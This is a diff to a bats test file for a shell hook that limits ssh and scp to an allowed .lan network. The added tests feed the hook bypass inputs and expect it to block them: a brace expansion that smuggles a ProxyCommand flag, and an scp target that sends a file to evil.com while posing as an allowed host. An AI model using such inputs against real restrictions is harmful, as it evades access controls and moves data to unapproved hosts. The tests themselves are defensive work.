@@ -59,7 +59,16 @@ with_valid_key() {
     [[ "${output}" == *'no usable SSH key'* ]]
 }
 
-@test "SSH_AUTH_SOCK set but ssh-add not installed is blocked" {
+@test "SSH_AUTH_SOCK set but pointing at an unreachable socket is blocked" {
+    # Named/scoped for what this actually exercises, not "ssh-add not
+    # installed" - the real ssh-add binary is on PATH in this environment
+    # (and in CI), so this test cannot force `command -v ssh-add` to fail
+    # without engineering a synthetic minimal PATH, which isn't attempted
+    # here (same trade-off already made for the "failing shfmt" test below:
+    # matches enforce-git-dash-c.bats, which doesn't test that branch
+    # either). This instead exercises the real ssh-add failing to connect to
+    # a socket that doesn't exist - a different route to the same "no
+    # usable SSH key" outcome (round 4 code review).
     export SSH_AUTH_SOCK="${TEST_TMP}/fake-agent.sock"
     run_hook "ssh dns-01.lan"
     [ "${status}" -eq 2 ]
@@ -289,6 +298,54 @@ with_valid_key() {
     run_hook "ssh 'dns-01\\.lan'"
     [ "${status}" -eq 2 ]
     [[ "${output}" == *'non-literal argument'* ]]
+}
+
+@test "brace expansion is blocked as non-literal, not accepted as a single word ending in .lan" {
+    with_valid_key
+    # ssh {-oProxyCommand=x,dns-01}.lan is one Lit word to shfmt (and would
+    # be accepted as a valid .lan-suffixed target without this guard), but
+    # real bash brace expansion turns it into TWO argv words at execution
+    # time - -oProxyCommand=x.lan and dns-01.lan - the first a live -o flag
+    # (round 4 code review, confirmed via shfmt --tojson vs. real bash
+    # brace expansion side by side).
+    run_hook 'ssh {-oProxyCommand=x,dns-01}.lan'
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'non-literal argument'* ]]
+}
+
+@test "a glob-metacharacter word is blocked as non-literal" {
+    with_valid_key
+    run_hook 'ssh -*'
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'non-literal argument'* ]]
+}
+
+@test "a tilde-prefixed target word is blocked as non-literal" {
+    with_valid_key
+    run_hook 'ssh ~dns-01.lan'
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *'non-literal argument'* ]]
+}
+
+@test "scp host extraction uses the spec before the first colon, not the first @ in the whole word" {
+    with_valid_key
+    # evil.com:x@dns-01.lan:y - real scp treats everything up to the FIRST
+    # ':' as the [user@]host spec (verified via `scp -v`, which reported
+    # "Executing: program ssh host evil.com"), so the host is evil.com; the
+    # '@' and second ':' are both inside the path portion and irrelevant.
+    # The previous version searched the whole word for '@' before finding
+    # the first ':', extracting dns-01.lan (an allowed host) instead (round
+    # 4 code review).
+    run_hook 'scp file.txt evil.com:x@dns-01.lan:y'
+    [ "${status}" -eq 2 ]
+    [[ "${output}" == *"evil.com"* ]]
+    [[ "${output}" == *'not in the allowed .lan network'* ]]
+}
+
+@test "scp host extraction still finds an @-prefixed user within the pre-colon spec" {
+    with_valid_key
+    run_hook 'scp file.txt user@dns-01.lan:/tmp/path@with-at:and-colons'
+    [ "${status}" -eq 0 ]
 }
 
 @test "scp -- end-of-options switches to literal parsing, so a dash-prefixed filename after it is not treated as a flag" {
